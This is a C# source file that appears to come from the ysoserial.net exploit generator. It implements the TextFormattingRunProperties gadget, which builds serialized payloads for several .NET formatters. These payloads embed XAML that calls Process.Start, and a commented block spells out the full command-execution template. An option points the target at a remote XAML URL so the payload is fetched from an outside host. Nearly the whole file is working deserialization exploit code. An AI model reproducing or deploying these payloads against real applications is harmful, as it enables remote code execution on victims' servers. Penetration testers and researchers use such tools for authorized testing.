using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using Microsoft.VisualStudio.Text.Formatting;
using ysoserial.Helpers;
using NDesk.Options;

namespace ysoserial.Generators
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);            
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }


    public class TextFormattingRunPropertiesGenerator : GenericGenerator
    {
        private string xaml_url = "";
        private bool hasRootDCS = false;

        public override string Name()
        {
            return "TextFormattingRunProperties";
        }

        public override string AdditionalInfo()
        {
            return "This normally generates the shortest payload";
        }

        public override string Finders()
        {
            return "Oleksandr Mirosh and Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeButDervied };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer" };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {                
                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
                {"hasRootDCS", "To include a root element with the DataContractSerializer payload.", v => hasRootDCS = v != null },
            };

            return options;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // commented for future reference (research purposes)
            /*
            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
            
            String cmdPart;

            
            if (hasArgs)
            {
                cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
        <System:String>""" + splittedCMD[1] + @""" </System:String>";
            }
            else
            {
                cmdPart = $@"<System:String>" + splittedCMD[0] + @"</System:String>";
            }


            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
	 <ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
     <ObjectDataProvider.MethodParameters>
        "+ cmdPart + @"
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
            

            // This is a little bit shorter to use startinfo
            if (hasArgs)
            {
                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @""" Arguments=""" + splittedCMD[1] + @"""/>";
            }
            else
            {
                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @"""/>";
            }

            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
>
	 <ObjectDataProvider x:Key="""" MethodName=""Start"">
     <ObjectDataProvider.ObjectInstance>
        <Process xmlns=""clr-namespace:System.Diagnostics;assembly=system"">
            <Process.StartInfo>" + cmdPart + @"</Process.StartInfo>
        </Process>
     </ObjectDataProvider.ObjectInstance>
    </ObjectDataProvider>
</ResourceDictionary>";
            */

            if (xaml_url != "")
            {
                // this is when it comes from GenerateWithInit 
                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
            }

            //SerializersHelper.ShowAll(TextFormattingRunPropertiesGadget(inputArgs));

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
            }
            else if (formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
            {
                string utfString = System.Text.Encoding.UTF8.GetString((byte [])SerializeWithNoTest(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs));

                string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor" }, null, FormatterType.NetDataContractXML, true);
                    }
                    else
                    {
                        payload = XMLMinifier.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }

                }

                return payload;
            }
            else if (formatter.ToLower().Equals("DataContractSerializer", StringComparison.OrdinalIgnoreCase))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                string payload = "";

                if (hasRootDCS)
                {
                    payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), "root", "type", typeof(TextFormattingRunProperties));
                }
                else
                {
                    payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)));
                }
                

                if (inputArgs.Minify)
                {
                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        if (hasRootDCS)
                        {
                            SerializersHelper.DataContractSerializer_deserialize(payload, "", "root", "type");
                        }
                        else
                        {
                            SerializersHelper.DataContractSerializer_deserialize(payload, typeof(TextFormattingRunProperties));
                        }
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }

                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
                
        }

        /* this can be used easily by the plugins as well */

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TextFormattingRunPropertiesGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TextFormattingRunPropertiesGadget(inputArgs);
        }

        public static object TextFormattingRunPropertiesGadget(InputArgs inputArgs)
        {
            ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
            string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();

            if (inputArgs.Minify)
            {
                xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
            }

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            return payload;
        }
    } 
}
